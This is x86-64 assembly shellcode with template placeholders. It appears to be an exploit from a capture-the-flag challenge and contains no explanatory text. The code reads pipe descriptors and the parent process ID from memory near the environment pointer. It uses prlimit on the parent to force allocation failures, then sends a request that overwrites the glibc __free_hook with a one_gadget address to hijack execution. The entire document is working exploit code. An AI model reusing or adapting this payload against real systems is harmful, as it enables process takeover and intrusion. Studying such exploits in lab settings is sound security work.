BITS 64
_start:
    mov r12, {environ}
    mov r12, [r12]
    mov r13, [r12-0x120]    ; p2c
    mov r14, [r12-0x114]    ; c2p
    mov r15, [r12-0x10c]    ; ppid

    ; prlimit(ppid, RLIMIT_AS, limit1, NULL)
    xor r10, r10
    lea rdx, [rel limit1]
    mov esi, 9
    mov rdi, r15 
    mov eax, 302
    syscall

loop:
    lea r10, [rel s]
    mov r11, [r10]
    inc r11
    mov [rel s], r11 
    ; write(c2p, &req, sizeof(req))
    mov edx, 24
    lea rsi, [rel new]
    mov rdi, r14 
    mov eax, 1
    syscall
    ; read(p2c, &res, sizeof(res))
    mov edx, 4
    lea rsi, [rel res]
    mov rdi, r13 
    mov eax, 0
    syscall
    mov eax, [rel res]
    test rax, rax 
    jz loop

    ; write(c2p, &req, sizeof(req))
    mov edx, 24
    lea rsi, [rel set]
    mov rdi, {free_hook}
    mov [rel i], rdi
    mov rdi, {one_gadget}
    mov [rel v], rdi
    mov rdi, r14 
    mov eax, 1
    syscall 

    ; prlimit(ppid, RLIMIT_AS, limit2, NULL)
    xor r10, r10
    lea rdx, [rel limit2]
    mov esi, 9
    mov rdi, r15 
    mov eax, 302
    syscall

    ; write(c2p, &req, sizeof(req))
    mov edx, 24
    lea rsi, [rel new]
    mov rdi, r14 
    mov eax, 1
    syscall

    ; write(c2p, &req, sizeof(req))
    mov edx, 24
    lea rsi, [rel new]
    mov rdi, r14 
    mov eax, 1
    syscall

    hlt

limit1:
    dq 0            ; soft limit
    dq 0xffffffff   ; hard limit
limit2:
    dq 0xffffffff   ; soft limit
    dq 0xffffffff   ; hard limit
new:
    dq 0            ; cmd
s:  dq 0            ; size
    dq 0            ; value
set: 
    dq 1            ; cmd
i:  dq 0            ; index
v:  dq 0            ; value
res:
    dd 0